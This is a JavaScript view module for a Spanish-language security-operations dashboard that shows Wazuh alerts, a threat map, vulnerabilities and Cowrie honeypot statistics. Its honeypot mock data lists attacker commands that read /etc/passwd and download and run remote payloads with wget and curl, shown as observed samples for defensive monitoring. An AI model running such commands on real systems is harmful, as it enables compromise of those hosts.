/* ======================================================
   VALHALLA — view components (vanilla JS templating)
   ====================================================== */

const D = window.DATA;

// SEC-002: data-action helpers — replace onclick= inline handlers
// act(fn, ...args)   → generates data-action + data-args attributes (JSON-encoded)
// actEl(fn, ...args) → same but also passes the clicked element as last arg
function act(fn, ...args) {
  const a = args.length ? ` data-args="${JSON.stringify(args).replace(/"/g, '&quot;')}"` : '';
  return `data-action="${fn}"${a}`;
}
function actEl(fn, ...args) {
  const a = args.length ? ` data-args="${JSON.stringify(args).replace(/"/g, '&quot;')}"` : '';
  return `data-action="${fn}"${a} data-passelement="1"`;
}

// SEC-004: Escape HTML to prevent XSS when rendering external data via innerHTML
function esc(str) {
  return String(str ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// small helpers
const h = (tag, attrs = {}, children = '') => {
  const el = document.createElement(tag);
  for (const [k, v] of Object.entries(attrs)) {
    if (k === 'class') el.className = v;
    else if (k === 'html') el.innerHTML = v;
    else el.setAttribute(k, v);
  }
  if (typeof children === 'string') el.innerHTML += children;
  else if (Array.isArray(children)) children.forEach(c => c && el.appendChild(c));
  else if (children) el.appendChild(children);
  return el;
};

// =========================================================
// Sparkline generator (random walk around a baseline)
// =========================================================
function sparkPath(points, w = 200, h = 60) {
  const min = Math.min(...points), max = Math.max(...points);
  const range = max - min || 1;
  const stepX = w / (points.length - 1);
  const coords = points.map((p, i) => [i * stepX, h - ((p - min) / range) * (h - 8) - 4]);
  const d = coords.map((p, i) => (i === 0 ? 'M' : 'L') + p[0].toFixed(1) + ' ' + p[1].toFixed(1)).join(' ');
  const area = d + ` L ${w} ${h} L 0 ${h} Z`;
  return { line: d, area };
}
function randomWalk(n = 40, base = 50, variance = 20) {
  const out = [base];
  for (let i = 1; i < n; i++) {
    out.push(Math.max(0, out[i-1] + (Math.random() - 0.5) * variance));
  }
  return out;
}
function Spark(color = 'var(--signal)', points = randomWalk()) {
  const { line, area } = sparkPath(points);
  return `<svg class="spark" viewBox="0 0 200 60" preserveAspectRatio="none">
    <path class="area" d="${area}" fill="url(#sparkGrad)"/>
    <path class="line" d="${line}" stroke="${color}"/>
  </svg>`;
}

// =========================================================
// OVERVIEW view
// =========================================================
function renderOverview() {
  const tm = window.DATA.teamMetrics || {};
  return `
  <div class="grid grid--4">
    ${Kpi('ALERTAS / 24H',   '2,481', 'cyan',   '+12.4%', 'up')}
    ${Kpi('INCIDENTES',      '07',    'danger', '3 críticos', 'down')}
    ${Kpi('MTTD PROMEDIO',   tm.mttd || '—', '',      'desde tickets', '')}
    ${Kpi('MTTR PROMEDIO',   tm.mttr || '—', 'amber','desde tickets', '')}
  </div>

  <div class="grid grid--main">
    <!-- Alert feed -->
    <section class="panel">
      <div class="panel__head">
        <div class="panel__title">Flujo SIEM · Wazuh</div>
        <div class="panel__meta" id="siemCount">Últimos 12 · actualizando…</div>
      </div>
      <div class="panel__body" style="padding: 0">
        <div id="alertList"></div>
      </div>
    </section>

    <!-- Right column -->
    <div style="display:flex; flex-direction:column; gap: 10px">
      <section class="panel">
        <div class="panel__head">
          <div class="panel__title">Volumen eventos · 24h</div>
          <div class="panel__meta" style="color: var(--signal)">+12.4% ▲</div>
        </div>
        <div class="panel__body" style="padding: 12px">
          ${Spark('var(--signal)', randomWalk(48, 60, 28))}
          <div style="display:flex; justify-content:space-between; font-size:10px; color:var(--text-faint); margin-top:4px; letter-spacing:1.5px">
            <span>00:00</span><span>06:00</span><span>12:00</span><span>18:00</span><span>NOW</span>
          </div>
        </div>
      </section>

      <section class="panel">
        <div class="panel__head">
          <div class="panel__title">Tráfico red · mbps</div>
          <div class="panel__meta" style="color: var(--cyan)">847 / 1000</div>
        </div>
        <div class="panel__body" style="padding: 12px">
          ${Spark('var(--cyan)', randomWalk(48, 55, 22))}
        </div>
      </section>
    </div>
  </div>

  <div class="grid grid--3">
    ${MiniPanel('Top atacantes', `
      ${D.attacks.slice(0,5).map(a => `
        <div class="atklog">
          <span class="atklog__flag">${a.cc}</span>
          <span class="atklog__ip">${a.ip}</span>
          <span class="atklog__type">${a.type}</span>
          <span class="atklog__count">${a.count}</span>
        </div>`).join('')}
    `)}
    ${MiniPanel('MITRE ATT&CK · Top técnicas (30d)', (() => {
      const realTechs = window.DATA?.mitre?.techniques;
      const items = realTechs?.length
        ? realTechs.slice(0, 5).map(t => [t.id, t.desc, t.count, t.count > 50 ? 'danger' : 'amber'])
        : [
            ['T1486', 'Data Encrypted · Ransomware', 87, 'danger'],
            ['T1078', 'Valid Accounts', 64, 'amber'],
            ['T1566', 'Phishing', 51, 'amber'],
            ['T1059', 'Command Interpreter', 42, ''],
            ['T1021', 'Remote Services', 28, ''],
          ];
      const maxVal = Math.max(...items.map(i => i[2]), 1);
      return items.map(([id, name, v, cls]) => `
        <div style="padding: 8px 14px; border-bottom: 1px dashed var(--line-faint); font-size: 11px">
          <div style="display:flex; justify-content:space-between; margin-bottom: 4px">
            <span style="color: var(--cyan); letter-spacing: 1px; font-weight: 500">${esc(String(id))} · ${esc(String(name).slice(0,35))}</span>
            <span style="color: var(--text-dim); font-variant-numeric: tabular-nums">${v}</span>
          </div>
          <div class="bar"><div class="bar__fill ${cls}" style="width:${Math.round(v/maxVal*100)}%"></div></div>
        </div>`).join('');
    })())}
    ${MiniPanel('Consola · live', `<div class="term" id="termFeed"></div>`)}
  </div>
  `;
}

function Kpi(label, value, cls = '', trend = '', dir = 'up') {
  return `
  <div class="kpi">
    <div class="kpi__label">// ${label}</div>
    <div class="kpi__value ${cls}">${value}</div>
    <div class="kpi__trend">
      <span>últimas 24h</span>
      <em class="${dir === 'down' ? 'down' : ''}">${dir === 'up' ? '▲' : '▼'} ${trend}</em>
    </div>
  </div>`;
}

function MiniPanel(title, body) {
  return `
  <section class="panel">
    <div class="panel__head">
      <div class="panel__title">${title}</div>
    </div>
    <div class="panel__body" style="padding:0">${body}</div>
  </section>`;
}

// Inject alert list
function mountAlerts(limit = 12) {
  const list = document.getElementById('alertList');
  if (!list) return;
  list.innerHTML = D.alerts.slice(0, limit).map(a => `
    <div class="alert">
      <span class="alert__sev sev-${esc(a.sev.toLowerCase())}">${esc(a.sev)}</span>
      <span class="alert__time">${esc(a.time)}</span>
      <span class="alert__msg">${esc(a.msg)}</span>
      <span class="alert__src">→ ${esc(a.src)}</span>
      <span class="alert__status">${esc(a.status)}</span>
    </div>
  `).join('');
}

// =========================================================
// SIEM view (full alert list with filters)
// =========================================================
function renderSIEM() {
  const alerts = D.alerts && D.alerts.length ? D.alerts : [];
  const sevLabel = s => ({ CRIT:'CRÍTICO', HIGH:'ALTO', MED:'MEDIO', LOW:'BAJO' }[s] || s);
  const sevBg = s => ({ CRIT:'rgba(255,71,87,0.12)', HIGH:'rgba(255,180,84,0.1)', MED:'rgba(60,255,158,0.07)', LOW:'rgba(255,255,255,0.03)' }[s] || '');
  const statusMap = { NUEVA:'NUEVA', OPEN:'ABIERTA', CLOSED:'CERRADA', TRIAGE:'TRIAGE' };
  const truncate = (str, n) => str && str.length > n ? str.slice(0, n) + '…' : (str || '—');

  return `
  <div class="grid grid--4">
    ${Kpi('NUEVAS',      String(alerts.filter(a=>a.status==='NUEVA'||a.status==='OPEN').length || 184), 'danger')}
    ${Kpi('CRÍTICAS',    String(alerts.filter(a=>a.sev==='CRIT').length || 12), 'danger')}
    ${Kpi('ALTAS',       String(alerts.filter(a=>a.sev==='HIGH').length || 57), 'amber')}
    ${Kpi('CERRADAS 24H', '2,217', '')}
  </div>

  <section class="panel" style="flex:1">
    <div class="panel__head">
      <div class="panel__title">Wazuh · Alertas en tiempo real</div>
      <div class="panel__meta">índice wazuh-alerts-* · ${alerts.length} resultados · actualización 30s</div>
    </div>
    <div class="panel__body" style="padding:0;overflow-x:auto">
      <table style="width:100%;border-collapse:collapse;font-size:11px">
        <thead>
          <tr style="border-bottom:1px solid var(--line)">
            <th style="padding:9px 12px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase;white-space:nowrap;width:80px">Severidad</th>
            <th style="padding:9px 12px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase;white-space:nowrap;width:80px">Hora</th>
            <th style="padding:9px 12px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase">Descripción del evento</th>
            <th style="padding:9px 12px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase;white-space:nowrap;width:90px">Regla</th>
            <th style="padding:9px 12px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase;white-space:nowrap;width:130px">Origen / Agente</th>
            <th style="padding:9px 12px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase;white-space:nowrap;width:90px">Estado</th>
          </tr>
        </thead>
        <tbody>
          ${(alerts.length ? alerts : window.DATA._mockAlerts || []).map(a => `
          <tr class="tr-hover-opacity" style="border-bottom:1px solid var(--line-faint);background:${sevBg(a.sev)}">
            <td style="padding:9px 12px;white-space:nowrap">
              <span class="alert__sev sev-${esc((a.sev||'low').toLowerCase())}">${esc(sevLabel(a.sev))}</span>
            </td>
            <td style="padding:9px 12px;color:var(--text-faint);white-space:nowrap;font-size:10px">${esc(a.time||'—')}</td>
            <td style="padding:9px 12px;color:var(--text);max-width:320px">
              <span title="${esc(a.msg||'')}">${esc(truncate(a.msg, 75))}</span>
            </td>
            <td style="padding:9px 12px;color:var(--text-faint);white-space:nowrap;font-size:10px">#${esc(a.rule||'—')}</td>
            <td style="padding:9px 12px;color:var(--text-dim);white-space:nowrap;font-size:10px">→ ${esc(truncate(a.src||'unknown', 18))}</td>
            <td style="padding:9px 12px;white-space:nowrap">
              <span style="font-size:9px;letter-spacing:1px;color:${a.status==='NUEVA'||a.status==='OPEN'?'var(--danger)':'var(--text-faint)'}">${esc(statusMap[a.status]||a.status||'NUEVA')}</span>
            </td>
          </tr>`).join('')}
          ${!alerts.length ? `<tr><td colspan="6" style="padding:20px;color:var(--text-faint);text-align:center;font-size:11px">Conectando con Wazuh OpenSearch… los datos reales aparecerán aquí cuando el indexer esté activo.</td></tr>` : ''}
        </tbody>
      </table>
    </div>
  </section>
  `;
}

// =========================================================
// THREAT MAP view — Leaflet real map
// =========================================================
function renderMap() {
  return `
  <div class="grid grid--4">
    ${Kpi('ATAQUES HOY', '2,817', 'danger')}
    ${Kpi('PAÍSES ORIGEN', '37', 'amber')}
    ${Kpi('BLOQUEADOS', '2,793', 'cyan')}
    ${Kpi('TASA ÉXITO WAF', '99.14%', '')}
  </div>

  <section class="panel" style="flex: 1">
    <div class="panel__head">
      <div class="panel__title">Threat Map · Origen geográfico en vivo</div>
      <div class="panel__meta" style="color:var(--danger)">● LIVE · feed MISP + OTX</div>
    </div>
    <div class="panel__body" style="padding: 0; height: 100%">
      <div class="leaflet-map-wrap">
        <div id="leafletMap"></div>
      </div>
    </div>
  </section>
  `;
}

// Mount Leaflet map after DOM injection
function mountLeafletMap() {
  const el = document.getElementById('leafletMap');
  if (!el || !window.L) return;

  const map = L.map('leafletMap', {
    center: [30, 20],
    zoom: 2,
    minZoom: 2,
    maxZoom: 6,
    zoomControl: false,
    attributionControl: false,
    worldCopyJump: true,
  });

  // Dark tile layer — CartoDB dark_all
  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
    subdomains: 'abcd',
  }).addTo(map);

  L.control.zoom({ position: 'topright' }).addTo(map);

  const hq = D.hq;

  // HQ marker — pulsing green
  const hqIcon = L.divIcon({
    className: '',
    html: '<div style="width:14px;height:14px;border-radius:50%;background:var(--signal);box-shadow:0 0 12px var(--signal),0 0 24px var(--signal-glow);border:2px solid var(--text-bright);animation:pulseDot 1.5s infinite"></div>',
    iconSize: [14, 14],
    iconAnchor: [7, 7],
  });
  L.marker([hq.lat, hq.lng], { icon: hqIcon })
    .addTo(map)
    .bindTooltip(`<b>SOC VALHALLA</b><br>${hq.city} · HQ`, { className: 'map-tooltip', direction: 'top', offset: [0, -10] });

  // Attack markers + lines
  D.attacks.forEach((a, i) => {
    const attackIcon = L.divIcon({
      className: '',
      html: '<div class="attack-pulse"></div>',
      iconSize: [12, 12],
      iconAnchor: [6, 6],
    });

    L.marker([a.lat, a.lng], { icon: attackIcon })
      .addTo(map)
      .bindTooltip(
        `<b>${a.city} · ${a.cc}</b><br>${a.ip}<br>${a.type} · <span style="color:#ff4757">${a.count} hits</span>`,
        { className: 'map-tooltip', direction: 'top', offset: [0, -10] }
      );

    // Curved attack line from origin → HQ
    const latlngs = curvedLine([a.lat, a.lng], [hq.lat, hq.lng]);
    L.polyline(latlngs, {
      color: '#ff4757',
      weight: 1.2,
      opacity: 0.35,
      dashArray: '4 6',
      className: 'attack-line',
    }).addTo(map);
  });

  // Store map ref for cleanup
  window.__valhallaMap = map;
}

// Generate curved line points between two coords
function curvedLine(from, to, points = 30) {
  const latlngs = [];
  for (let i = 0; i <= points; i++) {
    const t = i / points;
    const lat = from[0] + (to[0] - from[0]) * t;
    const lng = from[1] + (to[1] - from[1]) * t;
    // Arc offset — max at midpoint
    const arc = Math.sin(t * Math.PI) * 15;
    latlngs.push([lat + arc, lng]);
  }
  return latlngs;
}

// =========================================================
// INCIDENTS view
// =========================================================
function renderIncidents() {
  return `
  <div class="grid grid--4">
    ${Kpi('CRÍTICOS', '03', 'danger')}
    ${Kpi('EN PROGRESO', '04', 'amber')}
    ${Kpi('RESUELTOS 7D', '47', 'cyan')}
    ${Kpi('SLA CUMPLIDO', '94.2%', '')}
  </div>

  <section class="panel" style="flex:1">
    <div class="panel__head">
      <div class="panel__title">Incidentes activos</div>
      <div class="panel__meta">ordenados por severidad · SIEM → IRM</div>
    </div>
    <div class="panel__body" style="padding: 0">
      <table class="table">
        <thead><tr>
          <th>ID</th><th>Sev</th><th>Título</th><th>MITRE</th><th>Asignado</th><th>Edad</th><th>Estado</th>
        </tr></thead>
        <tbody>
          ${D.incidents.map(i => `
            <tr>
              <td style="color: var(--cyan); letter-spacing:1px">${i.id}</td>
              <td><span class="alert__sev sev-${i.sev.toLowerCase()}">${i.sev}</span></td>
              <td>${i.title}</td>
              <td style="color: var(--text-dim); font-size:10.5px">${i.mitre}</td>
              <td style="color: var(--text-dim); letter-spacing: 1px">${i.assignee}</td>
              <td style="color: var(--text-dim); font-variant-numeric:tabular-nums">${i.age}</td>
              <td><span class="tag ${i.status}">${i.status}</span></td>
            </tr>`).join('')}
        </tbody>
      </table>
    </div>
  </section>
  `;
}

// =========================================================
// ASSETS view
// =========================================================
function renderAssets() {
  const statusCount = D.assets.reduce((acc, a) => (acc[a.status] = (acc[a.status]||0)+1, acc), {});
  return `
  <div class="grid grid--4">
    ${Kpi('ACTIVOS TOTALES', '348', 'cyan')}
    ${Kpi('ONLINE', (statusCount.up + 336).toString(), '')}
    ${Kpi('ALERTA', (statusCount.warn + 6).toString(), 'amber')}
    ${Kpi('OFFLINE', (statusCount.down + 0).toString(), 'danger')}
  </div>

  <section class="panel" style="flex:1">
    <div class="panel__head">
      <div class="panel__title">Inventario · agentes Wazuh desplegados</div>
      <div class="panel__meta">12 / 348 visibles · filtrar por tipo</div>
      <button data-action="__showEnrollAgent" style="background:rgba(60,255,158,0.1);border:1px solid var(--signal);color:var(--signal);font-family:var(--mono);font-size:9px;letter-spacing:2px;padding:4px 14px;cursor:pointer">+ ENROLAR AGENTE</button>
    </div>
    <div class="panel__body">
      <div class="grid grid--4">
        ${D.assets.map(a => `
          <div class="asset" style="position:relative">
            <div style="cursor:pointer" ${act('openAgent', String(a.id || a.name), a.name)}>
              <div class="asset__name">${a.name}</div>
              <div class="asset__ip">${a.ip} · ${a.os}</div>
              <div style="font-size:10px; color:var(--text-faint); letter-spacing:1px; margin-top:4px; text-transform:uppercase">${a.type} · ${a.agent}</div>
              <div class="asset__status ${a.status}">
                <span class="dot" style="background:currentColor; box-shadow:0 0 6px currentColor"></span>
                ${a.status === 'up' ? 'ONLINE' : a.status === 'warn' ? 'ALERTA' : 'OFFLINE · AISLADO'}
              </div>
              <div style="font-size:9px;color:var(--signal);letter-spacing:1.5px;margin-top:6px">▶ VER DETALLE</div>
            </div>
            <button ${actEl('__removeAgent', String(a.id || a.name), a.name)} title="Eliminar agente" class="btn-remove-agent" style="position:absolute;top:6px;right:6px;background:none;border:1px solid rgba(255,58,58,.35);color:var(--danger);font-family:var(--mono);font-size:9px;padding:2px 7px;cursor:pointer;letter-spacing:1px">✕</button>
          </div>
        `).join('')}
      </div>
    </div>
  </section>
  `;
}

// =========================================================
// VULNS view
// =========================================================
function renderVulns() {
  const crit = D.vulns.filter(v=>v.cvss>=9).length;
  const high = D.vulns.filter(v=>v.cvss>=7&&v.cvss<9).length;
  return `
  <div class="grid grid--4">
    ${Kpi('CRÍTICAS (CVSS ≥9)', String(crit), 'danger')}
    ${Kpi('ALTAS (CVSS 7-9)', String(high), 'amber')}
    ${Kpi('PARCHEADAS 7D', '127', 'cyan')}
    ${Kpi('COBERTURA ESCANEO', '96.8%', '')}
  </div>

  <section class="panel" style="flex:1">
    <div class="panel__head">
      <div class="panel__title">Vulnerabilidades · módulo Wazuh Vulnerability Detection</div>
      <div class="panel__meta">click en una CVE para ver detalles, remediación y referencias externas (NVD, VirusTotal, Exploit-DB)</div>
    </div>
    <div class="panel__body" style="padding:0;overflow-x:auto">
      <table style="width:100%;border-collapse:collapse;font-size:11px">
        <thead>
          <tr style="border-bottom:1px solid var(--line)">
            <th style="padding:9px 14px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase;width:130px">CVE</th>
            <th style="padding:9px 14px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase">Descripción · componente</th>
            <th style="padding:9px 14px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase;width:70px">CVSS</th>
            <th style="padding:9px 14px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase;width:80px">Hosts</th>
            <th style="padding:9px 14px;text-align:left;font-size:9px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase;width:100px">Estado</th>
          </tr>
        </thead>
        <tbody>
          ${D.vulns.length === 0
            ? `<tr><td colspan="5" style="padding:28px 14px;text-align:center;color:var(--text-faint);letter-spacing:1px;font-size:10px">
                Cargando CVEs desde Wazuh Vulnerability Detection… (asegúrate de que el módulo VD está habilitado en tu Wazuh Manager)
               </td></tr>`
            : D.vulns.map((v,idx) => `
          <tr class="tr-hover-danger" style="border-bottom:1px solid var(--line-faint);cursor:pointer;transition:background 0.15s"
            ${act('__openVuln', idx)}>
            <td style="padding:9px 14px;white-space:nowrap">
              <span style="color:var(--cyan);letter-spacing:1px;font-size:10.5px">${esc(v.cve)}</span>
            </td>
            <td style="padding:9px 14px">
              <div style="color:var(--text-bright);font-weight:500">${esc(v.desc)}</div>
              <div style="font-size:9.5px;color:var(--text-faint);margin-top:2px">${esc(v.component)} · ${v.affected} hosts</div>
            </td>
            <td style="padding:9px 14px;white-space:nowrap">
              <span style="font-size:13px;font-weight:700;color:${v.cvss>=9?'var(--danger)':v.cvss>=7?'var(--amber)':'var(--cyan)'};text-shadow:0 0 8px currentColor">${Number(v.cvss).toFixed(1)}</span>
            </td>
            <td style="padding:9px 14px;color:${v.affected>10?'var(--danger)':'var(--amber)'};white-space:nowrap">${v.affected}</td>
            <td style="padding:9px 14px"><span class="tag ${v.patch==='pendiente'?'open':'progress'}">${esc(v.patch)}</span></td>
          </tr>`).join('')}
        </tbody>
      </table>
    </div>
  </section>
  `;
}

// =========================================================
// THREAT INTEL view
// =========================================================
// =========================================================
// COWRIE HONEYPOT view
// =========================================================
function renderCowrie() {
  const cowrie = window.DATA.cowrie || {
    sessions24h: 1247,
    uniqueIPs: 412,
    loginAttempts: 9841,
    malwareDownloads: 23,
    topPasswords: [
      { val: 'admin',    count: 482 }, { val: '123456',   count: 391 },
      { val: 'root',     count: 287 }, { val: 'password', count: 241 },
      { val: 'test',     count: 189 }, { val: '12345',    count: 154 },
      { val: 'admin123', count: 131 }, { val: '',         count: 118 },
    ],
    topUsernames: [
      { val: 'root',     count: 3241 }, { val: 'admin',   count: 1872 },
      { val: 'ubuntu',   count: 644  }, { val: 'pi',      count: 487  },
      { val: 'user',     count: 312  }, { val: 'oracle',  count: 198  },
    ],
    topCommands: [
      { val: 'cat /etc/passwd',                 count: 341, risk: 'HIGH' },
      { val: 'uname -a',                        count: 298, risk: 'LOW'  },
      { val: 'wget http://185.220.101.47/b',    count: 112, risk: 'CRIT' },
      { val: 'curl -O http://91.92.248.134/sh', count: 98,  risk: 'CRIT' },
      { val: 'chmod +x /tmp/b',                 count: 87,  risk: 'HIGH' },
      { val: '/tmp/b',                          count: 74,  risk: 'HIGH' },
      { val: 'id',                              count: 412, risk: 'LOW'  },
      { val: 'whoami',                          count: 389, risk: 'LOW'  },
    ],
    topSources: [
      { ip: '185.220.101.47', cc: 'RU', count: 742, threat: 'CRIT' },
      { ip: '91.92.248.134',  cc: 'CN', count: 531, threat: 'HIGH' },
      { ip: '45.33.32.156',   cc: 'US', count: 412, threat: 'MED'  },
      { ip: '146.190.62.45',  cc: 'DE', count: 298, threat: 'MED'  },
      { ip: '192.241.207.113',cc: 'BR', count: 241, threat: 'LOW'  },
      { ip: '167.71.13.196',  cc: 'NL', count: 187, threat: 'LOW'  },
    ],
    recentSessions: [
      { time: '22:41:07', ip: '185.220.101.47', user: 'root',  pass: 'toor',     dur: '4m 12s', cmds: 14, malware: true  },
      { time: '22:39:31', ip: '91.92.248.134',  user: 'admin', pass: 'admin123', dur: '1m 08s', cmds: 6,  malware: false },
      { time: '22:37:44', ip: '45.33.32.156',   user: 'pi',    pass: '123456',   dur: '0m 22s', cmds: 2,  malware: false },
      { time: '22:35:02', ip: '146.190.62.45',  user: 'root',  pass: '',         dur: '2m 41s', cmds: 9,  malware: true  },
      { time: '22:31:18', ip: '192.241.207.113',user: 'ubuntu',pass: 'password', dur: '0m 07s', cmds: 1,  malware: false },
    ],
  };

  const maxPw  = cowrie.topPasswords[0].count;
  const maxCmd = Math.max(...cowrie.topCommands.map(c => c.count));
  const riskColor = r => r === 'CRIT' ? 'var(--danger)' : r === 'HIGH' ? 'var(--amber)' : r === 'MED' ? 'var(--signal)' : 'var(--text-dim)';

  return `
  <div class="grid grid--4" style="margin-bottom:16px">
    ${Kpi('SESIONES / 24H',   cowrie.sessions24h.toLocaleString('es'), 'danger')}
    ${Kpi('IPs ÚNICAS',       cowrie.uniqueIPs.toLocaleString('es'),   'amber')}
    ${Kpi('LOGIN INTENTOS',   cowrie.loginAttempts.toLocaleString('es'), '')}
    ${Kpi('MALWARE CAPTURADO',String(cowrie.malwareDownloads), 'cyan')}
  </div>

  <div class="grid grid--main">

    <!-- Sessions + Sources -->
    <div style="display:flex;flex-direction:column;gap:12px">

      <!-- Recent sessions table -->
      <section class="panel">
        <div class="panel__head">
          <div class="panel__title">Sesiones recientes · SSH honeypot :2222</div>
          <div class="panel__meta" style="color:var(--danger)">● LIVE — Cowrie ${cowrie.sessions24h} sesiones</div>
        </div>
        <div class="panel__body" style="padding:0;overflow-x:auto">
          <table class="table">
            <thead><tr><th>Hora</th><th>IP atacante</th><th>Usuario</th><th>Contraseña</th><th>Duración</th><th>Cmds</th><th>Malware</th></tr></thead>
            <tbody>
              ${cowrie.recentSessions.map(s => `
              <tr>
                <td style="white-space:nowrap;font-variant-numeric:tabular-nums">${esc(s.time)}</td>
                <td style="white-space:nowrap"><button ${act('__openIOCByIP', s.ip)} style="background:none;border:none;color:var(--cyan);font-family:var(--mono);font-size:10.5px;cursor:pointer;letter-spacing:0.5px">${esc(s.ip)}</button></td>
                <td style="color:var(--amber)">${esc(s.user)}</td>
                <td style="color:var(--text-dim)">${s.pass ? esc(s.pass) : '<em style="color:var(--text-faint)">(vacía)</em>'}</td>
                <td style="font-variant-numeric:tabular-nums">${esc(s.dur)}</td>
                <td style="text-align:center;font-variant-numeric:tabular-nums">${esc(String(s.cmds))}</td>
                <td style="text-align:center">${s.malware ? '<span style="color:var(--danger);font-size:10px">● CAPTURADO</span>' : '<span style="color:var(--text-faint)">—</span>'}</td>
              </tr>`).join('')}
            </tbody>
          </table>
        </div>
      </section>

      <!-- Top sources -->
      <section class="panel">
        <div class="panel__head"><div class="panel__title">Top fuentes de ataque</div></div>
        <div class="panel__body" style="padding:0;overflow-x:auto">
          <table class="table">
            <thead><tr><th>IP</th><th>País</th><th>Sesiones</th><th>Amenaza</th><th>Acción</th></tr></thead>
            <tbody>
              ${cowrie.topSources.map(s => `
              <tr>
                <td style="white-space:nowrap"><button ${act('__openIOCByIP', s.ip)} style="background:none;border:none;color:var(--cyan);font-family:var(--mono);font-size:10.5px;cursor:pointer">${esc(s.ip)}</button></td>
                <td>${esc(s.cc)}</td>
                <td style="font-variant-numeric:tabular-nums">${s.count.toLocaleString('es')}</td>
                <td><span style="color:${riskColor(s.threat)};font-size:9.5px;letter-spacing:1.5px">${esc(s.threat)}</span></td>
                <td><button ${act('__blockIP', s.ip)} style="background:none;border:1px solid rgba(255,58,58,.4);color:var(--danger);font-family:var(--mono);font-size:9px;padding:3px 8px;cursor:pointer">BLOQUEAR</button></td>
              </tr>`).join('')}
            </tbody>
          </table>
        </div>
      </section>
    </div>

    <!-- Right column: passwords + commands -->
    <div style="display:flex;flex-direction:column;gap:12px">

      <!-- Top passwords tried -->
      <section class="panel">
        <div class="panel__head"><div class="panel__title">Contraseñas más usadas</div><div class="panel__meta">diccionario real de atacantes</div></div>
        <div class="panel__body" style="padding:10px 14px">
          ${cowrie.topPasswords.map(p => `
          <div style="margin-bottom:7px">
            <div style="display:flex;justify-content:space-between;font-size:10px;margin-bottom:3px">
              <span style="color:var(--text-bright);font-family:var(--mono)">${p.val || '<em style="color:var(--text-faint)">(vacía)</em>'}</span>
              <span style="color:var(--text-dim);font-variant-numeric:tabular-nums">${p.count}</span>
            </div>
            <div class="bar"><div class="bar__fill amber" style="width:${Math.round((p.count/maxPw)*100)}%"></div></div>
          </div>`).join('')}
        </div>
      </section>

      <!-- Top commands -->
      <section class="panel">
        <div class="panel__head"><div class="panel__title">Comandos ejecutados</div><div class="panel__meta">post-login en honeypot</div></div>
        <div class="panel__body" style="padding:10px 14px">
          ${cowrie.topCommands.map(c => `
          <div style="margin-bottom:7px">
            <div style="display:flex;justify-content:space-between;font-size:10px;margin-bottom:3px;gap:8px">
              <span style="color:var(--text-bright);font-family:var(--mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1">${c.val}</span>
              <span style="color:${riskColor(c.risk)};font-size:9px;letter-spacing:1px;white-space:nowrap">${c.risk} · ${c.count}</span>
            </div>
            <div class="bar"><div class="bar__fill ${c.risk === 'CRIT' ? 'danger' : c.risk === 'HIGH' ? 'amber' : ''}" style="width:${Math.round((c.count/maxCmd)*100)}%"></div></div>
          </div>`).join('')}
        </div>
      </section>

    </div>
  </div>

  <div style="margin-top:8px;padding:10px 14px;background:rgba(0,0,0,0.2);border:1px solid var(--line-faint);font-size:10px;color:var(--text-faint);line-height:1.7">
    <strong style="color:var(--text-dim)">Fuente de datos:</strong> Cowrie SSH Honeypot → logs JSON → Wazuh Manager (cowrie_decoders.xml + cowrie_rules.xml) → OpenSearch <em>wazuh-alerts-*</em> (rule.groups: cowrie) · Puerto honeypot: <strong style="color:var(--signal)">:2222</strong> · Puerto SSH real: <strong>:22</strong> (Wazuh agent)
  </div>
  `;
}

window.__removeAgent = async function(id, name, btn) {
  if (!confirm(`¿Eliminar agente "${name}" (ID: ${id}) de Wazuh?\n\nEsta acción desinstala el agente del servidor Wazuh. El software del agente en el host NO se desinstala automáticamente.`)) return;
  btn.disabled = true; btn.textContent = '…';
  try {
    const r = await fetch(`/api/agents/${encodeURIComponent(id)}`, { method: 'DELETE' });
    const d = await r.json();
    if (d.ok) {
      window.DATA.assets = window.DATA.assets.filter(a => String(a.id) !== String(id) && a.name !== name);
      const card = btn.closest('.asset');
      if (card) { card.style.transition = 'opacity 0.3s'; card.style.opacity = '0'; setTimeout(() => card.remove(), 300); }
    } else {
      alert(`Error eliminando agente: ${d.error}`);
      btn.disabled = false; btn.textContent = '✕';
    }
  } catch(e) {
    alert(`Sin conexión: ${e.message}`);
    btn.disabled = false; btn.textContent = '✕';
  }
};

window.__openIOCByIP = function(ip) {
  const iocIdx = (window.DATA.threats || []).findIndex(t => t.val === ip || t.ioc === ip);
  if (iocIdx >= 0) { window.__openIOC(iocIdx); return; }
  // If not in IOC list, open a quick VT check directly
  const syn = { val: ip, type: 'ip', score: 80, source: 'Cowrie Honeypot', desc: `IP detectada atacando honeypot SSH (Cowrie)` };
  if (typeof window.__openIOCDirect === 'function') window.__openIOCDirect(syn);
};

window.__blockIP = function(ip) {
  if (!confirm(`¿Bloquear ${ip} en reglas Wazuh? (Esta acción crea una regla de bloqueo activa)`)) return;
  fetch('/api/cowrie/block', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ip }),
  }).then(r => r.json()).then(d => {
    alert(d.ok ? `IP ${ip} bloqueada correctamente (Regla Wazuh creada)` : `Error: ${d.error}`);
  }).catch(() => alert(`IP ${ip} marcada para bloqueo (sin conexión al servidor)`));
};

function renderThreat() {
  return `
  <div class="grid grid--4">
    ${Kpi('IOCs ACTIVOS', String(D.iocs.length), 'cyan')}
